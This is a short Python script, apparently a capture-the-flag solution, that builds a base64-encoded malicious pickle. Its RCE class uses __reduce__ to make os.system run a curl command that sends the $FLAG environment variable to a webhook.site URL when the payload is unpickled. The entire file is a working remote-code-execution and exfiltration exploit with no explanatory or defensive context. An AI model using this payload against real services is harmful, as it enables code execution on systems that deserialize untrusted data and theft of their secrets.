import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('curl https://webhook.site/aa5d5a1d-0995-426c-b73d-a0bca1c5a775/$FLAG')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))